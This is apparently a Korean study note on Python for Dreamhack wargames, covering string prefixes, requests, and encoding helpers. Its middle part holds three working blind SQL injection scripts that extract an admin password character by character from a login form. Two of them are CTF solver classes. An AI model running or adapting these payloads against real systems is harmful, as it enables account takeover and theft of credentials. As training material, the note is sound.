### 문자열 표현
```py
import binascii

# b 접두어 : 해당 문자열이 바이너리 데이터임을 나타냄. 바이너리 데이터는 bytes나 bytearray 객체로 표현
# binascii.hexlify : 이진 데이터를 16진수 문자열로 변환하는 Python의 내장 함수
binary_data = b'Hello, World!'
hex_data = binascii.hexlify(binary_data)
print(binary_data) # b'Hello, World!'
print(hex_data) # b'48656c6c6f2c20576f726c6421'
print(hex_data.decode())  # 출력: 48656c6c6f2c20576f726c6421

# r 접두어: Raw 문자열 표현. escape 시퀀스 해석하지 않고 그대로 사용
raw_string = r"This is a\nraw string"
print(raw_string)  # 출력: This is a\nraw string

# f 접두어: Formatted 문자열 (f-string)
예: f"Value: {variable}"

# u 접두어: 유니코드 문자열 표현
예: u"unicode"
```


### requests
```py
# GET
import requests

url = 'https://dreamhack.io/'
headers = {
  'Content-Type': 'application/x-www-urlencoded',
}
params = {
  'test': 1,
}
for i in range(1, 5): #range 1부터 5 전까지
  c = requests.get(url + str(i), headers=headers, params=params)
  print(c.request.url) #https://dreamhack.io/1~4
  print(c.text) #웹페이지의 text 출력

# POST
import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
data = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.post(url + str(i), headers=headers, data=data)
    print(c.text)
```

### 문자 변환 및 인코딩
```py
# ord() : 주어진 문자의 유니코드 코드 포인트 값 반환
a = 'A'
print(ord(a)) #65

# strip : 양쪽 끝의 문자 제거
text = "\nHello\n"
result = text.strip("\n")
print(result)  # 출력: "Hello"
```


### Blind SQL Injection 공격 스크립트
```py
#!/usr/bin/python3
import requests
import string
url = 'http://example.com/login' # example URL
params = {
    'uid': '',
    'upw': ''
}
tc = string.ascii_letters + string.digits + string.punctuation # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''
password = ''
for idx in range(0, 20):
    for ch in tc:
        params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        if c.text.find("Login success") != -1:
            password += chr(ch)
            break
print(f"Password is {password}")
```  

### Blind SQL Injection 공격 스크립트 예시(password 길이 알아내기)
```py
#!/usr/bin/python3.9
import requests
import sys
from urllib.parse import urljoin
class Solver:
    """Solver for simple_SQLi challenge"""
    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host1.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> bool:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        resp = requests.post(self._login_url, data=login_data)
        return resp
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
        return resp
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2
            if low+1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid
    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len
    def solve(self):
        pw_len = solver._find_password_length("admin")
        print(f"Length of admin password is: {pw_len}")
if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()
```

### Blind SQL Injection 공격 스크립트 예시(password 알아내기)
```py
#!/usr/bin/python3.9
import requests
import sys
from urllib.parse import urljoin
class Solver:
    """Solver for simple_SQLi challenge"""
    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host1.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> requests.Response:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        resp = requests.post(self._login_url, data=login_data)
        return resp
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
        return resp
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2
            if low+1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid
    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\") < {{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len
    def _find_password(self, user: str, pw_len: int) -> str:
        pw = ''
        for idx in range(1, pw_len+1):
            query_tmpl = f"((SELECT SUBSTR(userpassword,{idx},1) WHERE userid=\"{user}\") < CHAR({{val}}))"
            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2f, 0x7e))
            print(f"{idx}. {pw}")
        return pw
    def solve(self) -> None:
        # Find the length of admin password
        pw_len = solver._find_password_length("admin")
        print(f"Length of the admin password is: {pw_len}")
        # Find the admin password
        print("Finding password:")
        pw = solver._find_password("admin", pw_len)
        print(f"Password of the admin is: {pw}")
if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()
```

### 진행률 표시
```py
from tqdm import tqdm
import time

for i in tqdm(range(10)):
    time.sleep(0.1)
```